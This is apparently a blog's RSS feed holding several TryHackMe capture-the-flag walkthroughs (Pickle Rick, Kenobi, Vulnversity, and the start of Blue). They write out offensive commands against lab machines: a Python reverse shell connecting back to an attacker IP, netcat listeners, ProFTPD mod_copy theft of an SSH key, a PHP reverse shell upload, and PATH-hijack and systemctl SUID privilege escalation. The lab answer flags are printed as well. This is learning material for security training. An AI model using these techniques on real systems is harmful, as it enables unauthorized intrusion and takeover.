<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Sup3rS3cretPickl3Ingred.txt
</span></span><span style="display:flex;"><span>assets
</span></span><span style="display:flex;"><span>clue.txt
</span></span><span style="display:flex;"><span>denied.php
</span></span><span style="display:flex;"><span>index.html
</span></span><span style="display:flex;"><span>login.php
</span></span><span style="display:flex;"><span>portal.php
</span></span><span style="display:flex;"><span>robots.txt
</span></span></code></pre></div><ul>
<li>Trying to <code>cat</code> out any file responds with that command being disabled.</li>
<li>A go to for me, seems a little long, but usually works for me is this bash syntax:
<em>use absolute path if necessary, default would be files in current working directory</em></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read line; <span style="color:#66d9ef">do</span> echo $line; <span style="color:#66d9ef">done</span> &lt; $FILE
</span></span><span style="display:flex;"><span>ex:
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read line; <span style="color:#66d9ef">do</span> echo $line; <span style="color:#66d9ef">done</span> &lt; Sup3rS3cretPickl3Ingred.txt
</span></span></code></pre></div><ul>
<li>Did that with both <code>Sup3rS3cretPickl3Ingred.txt</code>(our answer for question one) and <code>clue.txt</code>(clue to next ingredient)</li>
</ul>
<h1 id="heading-5"></h1>
<ul>
<li>Tried some different commands and found that this <em>slightly</em> obfuscated python3 reverse shell was able to work. To get the shell I ran:
<em>local machine</em></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p><em>in the command panel I pasted this(make sure you change you your ip and port)</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>p<span style="color:#ae81ff">\y</span>thon3 -c <span style="color:#e6db74">&#39;import os,pty,socket;s=socket.socket();s.connect((&#34;&lt;IP&gt;&#34;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&#34;bash&#34;)&#39;</span>
</span></span></code></pre></div><h1 id="heading-6"></h1>
<ul>
<li>Once I had a shell on the machine I ran <code>ls /home</code> to see any users&rsquo; home directories.</li>
<li>Noticed Rick&rsquo;s so I ran <code>ls -la /home/rick</code> and saw <code>second ingredients</code>.</li>
<li>Seeing the output that way let me know that it was a file with a space in the name so to cat it out I ran:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /home/rick/second<span style="color:#ae81ff">\ </span>ingredients
</span></span></code></pre></div><ul>
<li>And that got us the answer to the second question.</li>
</ul>
<h1 id="heading-7"></h1>
<ul>
<li>Gathering more information about the system I happened to run <code>sudo -l</code> and saw that user <code>www-data</code>(which was the user I was on as) could run any sudo command withought a password, so I ran:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
</span></span></code></pre></div><ul>
<li>And was given <code>root</code> access.</li>
</ul>
<h1 id="heading-8"></h1>
<ul>
<li>I traversed over to the <code>/root</code> dir and listed it&rsquo;s contents and saw <code>3rd.txt</code></li>
<li>After using <code>cat</code> to display <code>3rd.txt</code> we got the answer for the last question.</li>
</ul>
<h1 id="heading-9"></h1>
<h3 id="what-is-the-first-ingredient-rick-needs"><em>What is the first ingredient Rick needs?</em></h3>
<ul>
<li><strong>Answer</strong>: <code>mr. meeseek hair</code></li>
</ul>
<h1 id="heading-10"></h1>
<h3 id="whats-the-second-ingredient-rick-needs"><em>Whats the second ingredient Rick needs?</em></h3>
<ul>
<li><strong>Answer</strong>: <code>1 jerry tear</code></li>
</ul>
<h1 id="heading-11"></h1>
<h3 id="whats-the-final-ingredient-rick-needs"><em>Whats the final ingredient Rick needs?</em></h3>
<ul>
<li><strong>Answer</strong>: <code>fleep juice</code></li>
</ul>
<h1 id="heading-12"></h1>
<h1 id="heading-13"></h1>
<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
]]></content>
        </item>
        
        <item>
            <title>THM_Kenobi_Walkthrough</title>
            <link>https://xfafnir.com/posts/2023/04/thm_kenobi_walkthrough/</link>
            <pubDate>Wed, 12 Apr 2023 12:25:08 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2023/04/thm_kenobi_walkthrough/</guid>
            <description>Kenobi THM performed by: jb-willams Deploy the vulnerable machine Scan the machine with nmap, how many ports are open? Deploy the Machine and scan it with nmap nmap -v -p- -sV -sC -T4 -oA nmap/initial 10.10.223.56 &amp;amp;&amp;amp; grep -i &amp;#34;open&amp;#34; nmap/initial.nmap | cut -d&amp;#39; &amp;#39; -f 1 | cut -d&amp;#39;/&amp;#39; -f1 | tee nmap/ports.txt | wc -l notice, you may get some false positives that will have unknown service, ignore them</description>
            <content type="html"><![CDATA[<h1 id="kenobi-thm">Kenobi THM</h1>
<h4 id="performed-by-jb-willams">performed by: jb-willams</h4>
<h1 id="heading"></h1>
<h2 id="deploy-the-vulnerable-machine">Deploy the vulnerable machine</h2>
<h1 id="heading-1"></h1>
<h3 id="scan-the-machine-with-nmap-how-many-ports-are-open"><em>Scan the machine with nmap, how many ports are open?</em></h3>
<ul>
<li>Deploy the Machine and scan it with nmap</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -p- -sV -sC -T4 -oA nmap/initial 10.10.223.56 <span style="color:#f92672">&amp;&amp;</span> grep -i <span style="color:#e6db74">&#34;open&#34;</span> nmap/initial.nmap | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f <span style="color:#ae81ff">1</span> | cut -d<span style="color:#e6db74">&#39;/&#39;</span> -f1 | tee nmap/ports.txt | wc -l
</span></span></code></pre></div><p><em>notice, you may get some false positives that will have <code>unknown service</code>, ignore them</em></p>
<ul>
<li><strong>Answer</strong>: Number of ports open: <code>7</code></li>
</ul>
<h1 id="heading-2"></h1>
<h2 id="enumerating-samba-for-shares">Enumerating Samba for shares</h2>
<h1 id="heading-3"></h1>
<h3 id="using-the-nmap-command-above-how-many-shares-have-been-found"><em>Using the nmap command above, how many shares have been found?</em></h3>
<ul>
<li>Using the previous nmap command I found:
They ask you to notice the SMB service running and mention that it would be a good idea to enumerate these shares with nmap scripts.</li>
<li>SMB uses ports <code>445</code> <code>139</code> (usually)</li>
<li>You can enumerate SMB with this nmap command using these scripts</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">445</span> --script<span style="color:#f92672">=</span>smb-enum-shares.nse,smb-enum-users.nse 10.10.223.56
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>3</code></li>
</ul>
<h1 id="heading-4"></h1>
<h3 id="once-youre-connected-list-the-files-on-the-share-what-is-the-file-can-you-see"><em>Once you&rsquo;re connected, list the files on the share. What is the file can you see?</em></h3>
<ul>
<li>The scripts show an <code>anonymous</code> share.</li>
<li>Attempt to login to the share with <em>blank</em> password.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.10.223.56/anonymous
</span></span></code></pre></div><ul>
<li>To list the files run the <code>ls</code> cmd.</li>
<li>While logged in you can download that file running:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>get log.txt
</span></span></code></pre></div><ul>
<li>Or you can download recurisvely while not logged in with:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbget -R smb://10.10.223.56/anonymous
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>log.txt</code></li>
</ul>
<h1 id="heading-5"></h1>
<h3 id="what-port-is-ftp-runningon"><em>What port is FTP runningon</em>?</h3>
<ul>
<li>Reading the <code>log.txt</code> file the FTP service is running on:</li>
<li><strong>Answer</strong>: <code>21</code></li>
</ul>
<h1 id="heading-6"></h1>
<h3 id="what-mount-can-we-see"><em>What mount can we see?</em></h3>
<ul>
<li>Going back to our nmap scan for open ports we can see that there is RPC running on port 111(in this case) and we can enumerate that service more with nmap.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p <span style="color:#ae81ff">111</span> --script<span style="color:#f92672">=</span>nfs-ls,nfs-statfs,nfs-showmount 10.10.223.56
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>/var</code></li>
</ul>
<h1 id="heading-7"></h1>
<h2 id="gain-initial-access-with-proftpd">Gain initial access with ProFtpd</h2>
<h1 id="heading-8"></h1>
<h3 id="what-is-the-version"><em>What is the version?</em></h3>
<ul>
<li>With <code>netcat</code> you can do a quick connect to find the version of ProFTPD running.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.223.56 <span style="color:#ae81ff">21</span>
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>1.3.5</code></li>
</ul>
<h1 id="heading-9"></h1>
<h3 id="how-many-exploits-are-there-for-the-proftpd-running"><em>How many exploits are there for the ProFTPD running?</em></h3>
<ul>
<li>You can easily check for basice vulnerabilities with <code>searchsploit</code>.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit proftpd 1.3.5
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>4</code></li>
</ul>
<h1 id="heading-10"></h1>
<h3 id="what-is-kenobis-user-flag-homekenobiusertxt"><em>What is Kenobi&rsquo;s user flag (/home/kenobi/user.txt)?</em></h3>
<ul>
<li>We see from searchsploit there is a <code>mod_copy</code> vulnerability ins ProFTPD.</li>
<li>And from <code>log.txt</code> we know there is an ssh key created for the <code>kenobi</code> user.</li>
<li>So, lets try to copy <code>kenobi</code>&rsquo;s ssh key to the mountable directory.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 10.10.223.56 <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span> ProFTPD 1.3.5 Server <span style="color:#f92672">(</span>ProFTPD Default Installation<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.223.56<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>SITE CPFR /home/kenobi/.ssh/id_rsa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">350</span> File or directory exists, ready <span style="color:#66d9ef">for</span> destination name
</span></span><span style="display:flex;"><span>SITE CPTO /var/tmp/id_rsa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">250</span> Copy successful
</span></span><span style="display:flex;"><span>^C
</span></span></code></pre></div><ul>
<li>Earlier, with the scan on port 111, we saw that there is a mount point at <code>/var</code> and we just moved the ssh key to that directory tree.</li>
<li>Lets mount the <code>/var</code> dir to our machine</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir /mnt/kenobiNFS
</span></span><span style="display:flex;"><span>mount 10.10.223.56:/var /mnt/kenobiNFS
</span></span><span style="display:flex;"><span>ls -la /mnt/kenobiNFS
</span></span></code></pre></div><ul>
<li>And now we can traverse to <code>/mnt/kenobiNFS</code> and/or just copy it, and get kenobi&rsquo;s private key to login as that user.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cp /mnt/kenobiNFS/tmp/id_rsa .
</span></span><span style="display:flex;"><span>sudo chmod <span style="color:#ae81ff">600</span> id_rsa
</span></span><span style="display:flex;"><span>ssh -i id_rsa kenobi@10.10.223.56
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: d0b0f3f53b6caa532a83915e19224899</li>
</ul>
<h1 id="heading-11"></h1>
<h2 id="privilege-escalation-with-path-variable-manipulation">Privilege Escalation with Path Variable Manipulation</h2>
<h1 id="heading-12"></h1>
<h3 id="what-file-looks-particularly-out-of-the-ordinary"><em>What file looks particularly out of the ordinary?</em></h3>
<ul>
<li>They let you know some info about SUID&rsquo;s and that they can be used to escalate priveleges.</li>
<li>Using their command try to find the file that looks out of the ordinary. (I have used my own machine as reference several times)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</span></span></code></pre></div><ul>
<li><strong>Answer</strong>: <code>/usr/bin/menu</code></li>
</ul>
<h1 id="heading-13"></h1>
<h3 id="run-the-binary-how-many-options-appear"><em>Run the binary, how many options appear?</em></h3>
<ul>
<li><strong>Answer</strong>: <code>3</code></li>
</ul>
<h1 id="heading-14"></h1>
<h3 id="what-is-the-root-flag-rootroottxt"><em>What is the root flag (/root/root.txt)?</em></h3>
<ul>
<li>
<p>Looking at the binary <code>ls -la /usr/bin/menu</code> shows that it is owned by <code>root</code> and could run with root priveleges.</p>
</li>
<li>
<p>Running <code>strings /usr/bin/menu</code> shows that the commands are not being ran using the absolute path, so we may be able to exploit this.</p>
</li>
<li>
<p>We are going copy <code>/bin/bash</code> to <code>/tmp/curl</code> then modify the <code>$PATH</code> to read our binary first.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo /bin/bash &gt; /tmp/curl
</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /tmp/curl
</span></span><span style="display:flex;"><span>export PATH<span style="color:#f92672">=</span>/tmp:$PATH
</span></span></code></pre></div><ul>
<li>
<p>Then run <code>/usr/bin/menu</code> again and chose option <code>1</code> that uses curl and it will place you in a priveleged bash shell.</p>
</li>
<li>
<p><strong>Answer</strong>: <code>177b3cd8562289f37382721c28381f02</code></p>
</li>
</ul>
<h1 id="heading-15"></h1>
<h1 id="heading-16"></h1>
<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
]]></content>
        </item>
        
        <item>
            <title>THM_Vulnversity_Walkthrough</title>
            <link>https://xfafnir.com/posts/2023/04/thm_vulnversity_walkthrough/</link>
            <pubDate>Tue, 11 Apr 2023 15:50:37 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2023/04/thm_vulnversity_walkthrough/</guid>
            <description>Vulnversity Walkthrough TryHackMe performed by: jb-williams Reconnaisance They first ask for you to search for any nmap resourses(cheatsheets) online, I came across this one that seemed really useful: https://www.stationx.net/nmap-cheat-sheet/
The First Real Question
Scan the box, how many ports are open? I like to build up a chain of commands for most boxes.
While doing my scans I like to create a file that contains just the numerical port values to have.</description>
            <content type="html"><![CDATA[<h1 id="vulnversity-walkthrough-tryhackme">Vulnversity Walkthrough TryHackMe</h1>
<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
<h1 id="heading"></h1>
<h2 id="reconnaisance">Reconnaisance</h2>
<p>They first ask for you to search for any <code>nmap</code> resourses(cheatsheets) online, I came across this one that seemed really useful:
<code>https://www.stationx.net/nmap-cheat-sheet/</code></p>
<p><em>The First Real Question</em></p>
<h3 id="scan-the-box-how-many-ports-are-open"><strong>Scan the box, how many ports are open?</strong></h3>
<p>I like to build up a chain of commands for most boxes.</p>
<ul>
<li>While doing my scans I like to create a file that contains just the numerical port values to have. So my command came out like this:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -T4 -sV -sC -oA nmap/initial 10.10.124.14 <span style="color:#f92672">&amp;&amp;</span> grep -i <span style="color:#e6db74">&#34;open&#34;</span> nmap/initial.nmap | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f <span style="color:#ae81ff">1</span> | cut -d<span style="color:#e6db74">&#39;/&#39;</span> -f1 | tee nmap/ports.txt | wc -l
</span></span></code></pre></div><ul>
<li>Number of ports open: <code>6</code></li>
</ul>
<h1 id="heading-1"></h1>
<h3 id="what-version-of-the-squid-proxy-is-running-on-the-machine"><strong>What version of the <code>squid proxy</code> is running on the machine?</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;squid&#34;</span> nmap/initial.nmap | awk <span style="color:#e6db74">&#39;{print $NF}&#39;</span>
</span></span></code></pre></div><ul>
<li>Version of Squid Proxy: <code>3.5.12</code></li>
</ul>
<h1 id="heading-2"></h1>
<h3 id="how-many-ports-will-nmap-scan-if-the-flag--p-400-is-used"><strong>How many ports will nmap scan if the flag -p-400 is used?</strong></h3>
<ul>
<li>Looking at man page or online resource: <code>400</code></li>
</ul>
<h1 id="heading-3"></h1>
<h3 id="using-the-nmap-flag--n-what-will-it-not-resolve"><strong>Using the nmap flag -n what will it not resolve?</strong></h3>
<ul>
<li>Looking at man page or online resource: <code>DNS</code></li>
</ul>
<h1 id="heading-4"></h1>
<h3 id="what-is-the-most-likely-operating-system-this-machine-is-running"><strong>What is the most likely operating system this machine is running?</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;os&#34;</span> nmap/initial.nmap
</span></span></code></pre></div><ul>
<li>Quickly scanning output, you can see that: <code>Ubuntu</code> is listed most.</li>
</ul>
<h3 id="what-port-is-the-web-server-running-on"><strong>What port is the web server running on?</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;http&#34;</span> nmap/initial.nmap
</span></span></code></pre></div><ul>
<li>Http server is on port: <code>3333</code></li>
</ul>
<p><em>Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don&rsquo;t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)</em></p>
<h1 id="heading-5"></h1>
<h2 id="locating-directories-using-gobuster">Locating directories using GoBuster</h2>
<p>Using <code>gobuster</code>:</p>
<table>
<thead>
<tr>
<th>GoBuster flag</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-e</td>
<td>Print the full URLs in your console</td>
</tr>
<tr>
<td>-u</td>
<td>The target URL</td>
</tr>
<tr>
<td>-w</td>
<td>Path to your wordlist</td>
</tr>
<tr>
<td>-U and -P</td>
<td>Username and Password for Basic Auth</td>
</tr>
<tr>
<td>-p <!-- raw HTML omitted --></td>
<td>Proxy to use for requests</td>
</tr>
<tr>
<td>-c <!-- raw HTML omitted --></td>
<td>Specify a cookie for simulating your auth</td>
</tr>
</tbody>
</table>
<h3 id="what-is-the-directory-that-has-an-upload-form-page"><strong>What is the directory that has an upload form page?</strong></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.124.148:3333 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt -t <span style="color:#ae81ff">15</span>
</span></span></code></pre></div><p><em>I like using <code>feroxbuster</code> and it let me know more info esp. about the dir path sooner</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -e -u http://10.10.124.148:3333/
</span></span></code></pre></div><ul>
<li>The directory that has an upload form page is: <code>/internal/</code> and <code>/internal/uploads</code>(but they don&rsquo;t ask for this one, its just important to know about later)</li>
</ul>
<h1 id="heading-6"></h1>
<h2 id="compromise-the-webserver">Compromise the webserver</h2>
<p>After finding the form to upload files:</p>
<h3 id="what-file-type-which-youd-wnat-to-upload-to-exploit-the-server-is-blocked-try-a-couple-to-find-out"><em>What file type, which you&rsquo;d wnat to upload to exploit the server, is blocked? Try a couple to find out.</em>*</h3>
<ul>
<li>Fist, trying to upload a reverse shell: this was blocked <code>reverseshell.php</code></li>
</ul>
<h1 id="heading-7"></h1>
<ul>
<li>
<p>The room walks you through using <code>burp</code> to fuzz the upload for, I wrote a python script to fuzz for me.:</p>
</li>
<li>
<p>Url for the room to follow the <code>burp</code> walkthrough:</p>
</li>
<li>
<p><a href="https://tryhackme.com/room/vulnversity">Vulnversity</a></p>
</li>
<li>
<p>After testing different php file extensions, using curl,python,burp,zap to fuzz the upload form, you come across this one working: <code>.phtml</code></p>
</li>
<li>
<p>Download this PHP revsere shell <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">downloadLink</a> - <code>php-reverse-shell.phtml</code></p>
</li>
</ul>
<h1 id="heading-8"></h1>
<ul>
<li>Edit the file changing the IP to your <code>tun0</code> THM IP and desired port.</li>
<li>Setup a listener on the port specified in the reverse shell
ex:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><ul>
<li>Upload the reverse shell on the upload form and navigate here to execute the payload <code>http://&lt;IP&gt;:3333/internal/uploads/php-reverse-shell.phtml</code></li>
</ul>
<h3 id="what-is-the-name-of-the-user-who-managers-the-webserver"><em>What is the name of the user who managers the webserver?</em>*</h3>
<ul>
<li>
<p>Once on the machine:</p>
</li>
<li>
<p>Ls the <code>/home</code> dir and see user: <code>bill</code></p>
</li>
<li>
<p><em>What is the user flag?</em></p>
</li>
<li>
<p>Ls <code>/home/bill</code> and see <code>user.txt</code></p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /home/bill/user.txt
</span></span></code></pre></div><ul>
<li>The contents of <code>user.txt</code>: <code>8bd7992fbe8a6ad22a63361004cfcedb</code></li>
</ul>
<h2 id="privilage-escalation">Privilage Escalation</h2>
<p>Per THM -<br>
<em>In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</em></p>
<p><em>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.</em></p>
<h3 id="on-the-system-search-for-all-suid-files-what-file-stands-out"><strong>On the system search for all SUID files. What file stands out?</strong></h3>
<ul>
<li>I tend to use this <code>find</code> command to search for SUID&rsquo;s</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
</span></span></code></pre></div><ul>
<li>Sort of using my own system as a reference, I saw this one looking fairly unusual: <code>/bin/systemctl</code></li>
</ul>
<h1 id="heading-9"></h1>
<h3 id="become-root-and-get-the-last-flag-rootroottxt"><strong>Become root and get the last flag (/root/root.txt)</strong></h3>
<ul>
<li>Navigating to <a href="https://gtfobins.github.io/gtfobins/">GTFOBins</a> and search for that bin file.</li>
<li>I took the <code>Sudo (b)</code> one and modified it</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;[Service]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type=oneshot
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Install]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WantedBy=multi-user.target&#39;</span> &gt; $TF
</span></span><span style="display:flex;"><span>/bin/systemctl link $TF
</span></span><span style="display:flex;"><span>/bin/systemctl enable --now $TF
</span></span></code></pre></div><h1 id="heading-10"></h1>
<ul>
<li>I literally copy/pasted that chunk into my terminal and ran it.</li>
<li>Then I ran <code>bash -p</code> to escalate to <code>root</code></li>
<li>As root you can ls the <code>/root</code> dir: <code>ls /root</code> and see <code>root.txt</code></li>
<li>Cat out root.txt <code>cat /root/root.txt</code></li>
<li>The contents of root.txt: <code>a58ff8579f0a9270368d33a9966c7fd5</code></li>
</ul>
<h1 id="heading-11"></h1>
<h1 id="heading-12"></h1>
<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
]]></content>
        </item>
        
        <item>
            <title>THM_Blue_Walkthrough</title>
            <link>https://xfafnir.com/posts/2022/09/thm_blue_walkthrough/</link>
            <pubDate>Wed, 28 Sep 2022 10:21:14 -0500</pubDate>
            
            <guid>https://xfafnir.com/posts/2022/09/thm_blue_walkthrough/</guid>
            <description>Eternal Blue TryHackMe performed by: jb-williams Note- some output will be shortened denoted by &amp;ldquo;&amp;hellip;.&amp;rdquo;
Scanning/Recon After finding the IP address, I ran my basic nmap recon:
nmap -v -sV -sC -oN initial 10.10.10.13 Results -
PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) .... .... Came back with these results and noticed ports 138 and 445, which are usually SMB so I ran nmap with specific SMB scripts: the first one could work but I don&amp;rsquo;t think my VM could handle it so I did a little research and ran the second cmd</description>
            <content type="html"><![CDATA[<h1 id="eternal-blue-tryhackme">Eternal Blue TryHackMe</h1>
<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
<h1 id="heading"></h1>
<p><strong>Note-</strong> some output will be shortened denoted by &ldquo;&hellip;.&rdquo;</p>
<h1 id="heading-1"></h1>
<h2 id="scanningrecon">Scanning/Recon</h2>
<p>After finding the IP address, I ran my basic nmap recon:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -sV -sC -oN initial 10.10.10.13
</span></span></code></pre></div><p><strong>Results</strong> -</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds  Windows <span style="color:#ae81ff">7</span> Professional <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span> microsoft-ds
